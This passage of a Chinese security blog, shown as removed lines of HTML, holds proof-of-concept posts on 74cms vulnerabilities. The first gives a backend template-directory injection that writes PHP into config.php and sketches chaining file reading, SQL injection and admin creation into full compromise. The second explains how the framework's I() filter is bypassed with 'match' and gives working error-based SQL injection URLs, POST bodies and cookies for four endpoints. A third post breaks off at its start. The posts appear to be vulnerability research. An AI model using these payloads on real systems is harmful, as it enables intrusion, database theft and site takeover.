-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:26:11" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-
-<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02漏洞演示"><a href="#0x02漏洞演示" class="headerlink" title="0x02漏洞演示"></a>0x02漏洞演示</h2><p><img src="./resource/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
-
-shell:http://74cms.test/Application/Home/Conf/config.php
-路径：\74cms\upload\Application\Home\Conf\config.php</code></pre>
-<p><img src="./resource/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p><img src="./resource/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
-路径：74cms\upload\Application\Admin\Controller\TplController.class.php</code></pre>
-<p><img src="./resource/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
-<pre><code>路径： 74cms\upload\Application\Common\Controller\BackendController.class.php</code></pre>
-<p><img src="./resource/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<h2 id="0x04题外话-认真版getshell方法"><a href="#0x04题外话-认真版getshell方法" class="headerlink" title="0x04题外话-认真版getshell方法"></a>0x04题外话-认真版getshell方法</h2><p>认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿</p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/wecilm">https://www.yuque.com/pmiaowu/bfgkkh/wecilm</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">74cms v4.2.126-前台四处sql注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:24" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-<h1 id="74cms-v4-2-126-前台四处sql注入"><a href="#74cms-v4-2-126-前台四处sql注入" class="headerlink" title="74cms v4.2.126-前台四处sql注入"></a>74cms v4.2.126-前台四处sql注入</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02-概要"><a href="#0x02-概要" class="headerlink" title="0x02 概要"></a>0x02 概要</h2><dl><dt>这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞</dt><dd>)这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。ThinkPHP3.2.3框架实现安全数据库操作分析<a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/coglz1%E5%85%88%E7%9C%8B%E5%AE%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8%E7%9C%8B%E6%AD%A4%E6%96%87%E7%AB%A0%EF%BC%8C%E4%BC%9A%E6%9B%B4%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%86%E8%A7%A3%E6%B8%85%E6%A5%9A%E3%80%82">https://www.yuque.com/pmiaowu/bfgkkh/coglz1先看完上面的文章，然后在看此文章，会更简单的了解清楚。</a></dd></dl><h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>非常抱歉，让读者看到前面 3节 不是很有营养的东西。在前面最开始的时候，我说过我有对比源码，使用手册的情况。所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。为了能够更直观，这里开启调试文件：74cms\upload\Application\Common\Conf\config.php添加多一行</p>
-<pre><code>&#39;SHOW_PAGE_TRACE&#39;        =&gt;  true,</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
-<p>然后打开文件：74cms\upload\Application\Home\Controller\IndexController.class.php添加代码：</p>
-<pre><code>$uid = I(&#39;GET.uid&#39;);
-M(&#39;CompanyProfile&#39;)-&gt;field(&#39;companyname,logo&#39;)-&gt;where(array(&#39;uid&#39;=&gt;$uid))-&gt;find();</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
-<p>我感觉到这里可能有人要骂我了。应该有人会： 你个瓜皮，你家审计可以自己加代码的？是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数<br>I 所以也是没有框架注入这一说。这里又要重新重复讲解I函数的作用了在我的眼中I函数就是一个为了解决框架底层设计问题的函数</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
-<p>神奇的I函数路径:ThinkPHP\Common\functions.php方法名：function I($name,$default=&#39;&#39;,$filter=null,$datas=null)</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
-<p>这个函数的主要功能为3个1， 确定数据类型2， 对数据进行循环取值3， 调用think_filter 函数进行过滤think_filter函数分析</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
-<pre><code>例如：
-    没有使用think_filter 函数时
-goods_name[0]=in&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
-
-使用了think_filter函数时
-  goods_name[0]=in &amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
-  注意：使用了think_filter函数时 in后面是有空格的也就是说返回值是
-goods_name[0]=in(空格)&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
-而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。</code></pre>
-<p>接着我们直接打开文件：74cms\upload\ThinkPHP\Library\Think\Db\Driver.class.php</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
-<pre><code>think_filter函数与上图两者对比一下，是否发现多点了东西？
-是的没错了。
-74cms 修改了tp底层添加了
-3个新方法：
-match
-  match_mode
-  match_with
-
-也就是说这3个方法我们是可以绕过 I 函数的过滤的
-
-接着查看：parseWhereItem( 方法</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
-<p>使用的是直接字符串拼接的方式入库，故判断此漏洞可利用.注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！最开始的时候，记得我说过么，系统默认I 会过滤 “双引号”<br>而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。这里我们重新修改一下例子：打开文件：<br>74cms\upload\Application\Home\Controller\IndexController.class.php</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
-<pre><code>输入url: http://74cms.test/index.php?m=Home&amp;c=index&amp;a=index&amp;uid[0]=match&amp;uid[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) – a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png"></p>
-<p>这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。接下来整理一下会发生注入的情况M()-&gt;where($test)-&gt;xx那么只要 where中任意参数可控，并不会过滤 双引号即可！然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
-<p>前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看<br>: )</p>
-<h2 id="0x04-74cms独有框架漏洞第一处"><a href="#0x04-74cms独有框架漏洞第一处" class="headerlink" title="0x04 74cms独有框架漏洞第一处"></a>0x04 74cms独有框架漏洞第一处</h2><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php方法：function company_focus($company_id)是否需登录：需要登录权限：普通用户即可为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。登录后台</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
-<p>注册完成以后登录前台即可如果不登录的话，会显示这个样子url:<a target="_blank" rel="noopener" href="http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company%5C_focus">http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company\_focus</a></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png"></p>
-<pre><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png"></p>
-<p>看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
-<p>打开文件：<br>74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png"></p>
-<h2 id="0x05-74cms独有框架漏洞第二处"><a href="#0x05-74cms独有框架漏洞第二处" class="headerlink" title="0x05 74cms独有框架漏洞第二处"></a>0x05 74cms独有框架漏洞第二处</h2><p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
-<p>image</p>
-<p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png"></p>
-<p>注册完成以后登录前台即可</p>
-<pre><code>url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
-
-如果不登录的话，会显示这个样子
-url:http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png"></p>
-<pre><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png"></p>
-<p>看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png"></p>
-<p>打开文件：<br>74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png"></p>
-<h2 id="0x06-74cms独有框架漏洞第二处"><a href="#0x06-74cms独有框架漏洞第二处" class="headerlink" title="0x06 74cms独有框架漏洞第二处"></a>0x06 74cms独有框架漏洞第二处</h2><p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png"></p>
-<p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png"></p>
-<p>注册完成以后登录前台即可</p>
-<pre><code>url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) – a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png"></p>
-<h2 id="0x07-74cms独有框架漏洞第三处"><a href="#0x07-74cms独有框架漏洞第三处" class="headerlink" title="0x07 74cms独有框架漏洞第三处"></a>0x07 74cms独有框架漏洞第三处</h2><p>文件：74cms\upload\Application\Home\Controller\MembersController.class.php方法：register(是否需登录：不需要</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png"></p>
-<pre><code>url: 
-http://74cms.test/index.php?m=&amp;c=Members&amp;a=register
-post: 
-reg_type=2&amp;utype=2&amp;ucenter=bind&amp;unbind_mobile=1
-
-cookie:
-members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;
-
-headers:
-  Content-Type: application/x-www-form-urlencoded
-  X-Requested-With: XMLHttpRequest</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png"></p>
-<pre><code>这里我要大概讲一下参数的问题
-post: 
-reg_type=2            // 必须为2 为了绕过一个注册判断，为1的话，会直接创建帐户，导致无法利用漏洞
-utype=2         // 判断会员类型的也必须为2 为1会直接创建一条数据，导致无法利用漏洞      
-ucenter=bind           // 必须为bind因为要靠他，获取cookie(members_uc_info)并且合并为$data数组进行利用
-  unbind_mobile=1       // 只要有此字段即可，只是单纯为了满足流程判断的
-
-cookie:
-members_uc_info[reg_type]=1;         // 必须为1 满足流程需要
-members_uc_info[utype]=2;         // 必须为2 满足流程需要
-members_uc_info[mobile][0]=match;    // 框架漏洞利用
-members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;  // 这里输入注入语句
-
-headers:  // 伪造ajax操作
-  Content-Type: application/x-www-form-urlencoded
-  X-Requested-With: XMLHttpRequest</code></pre>
-<h2 id="0x07-74cms独有框架漏洞第四处"><a href="#0x07-74cms独有框架漏洞第四处" class="headerlink" title="0x07 74cms独有框架漏洞第四处"></a>0x07 74cms独有框架漏洞第四处</h2><pre><code>文件：74cms\upload\Application\Home\Controller\MembersController.class.php
-方法：oauth_reg (
-是否需登录：需要
-登录权限：普通用户/企业用户都可
-url: http://74cms.test/index.php?m=&amp;c=Members&amp;a=oauth_reg
-post:
-    username = 自己去平台随便注册个账号然后输入那个账号
-    password = 自己去平台随便注册个账号然后输入那个密码
-cookie:
-    members_bind_info[type][0]=match;
-members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png"></p>
-<p>看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl">https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:29:49" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-<h1 id="74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞"><a href="#74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞" class="headerlink" title="74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞"></a>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" 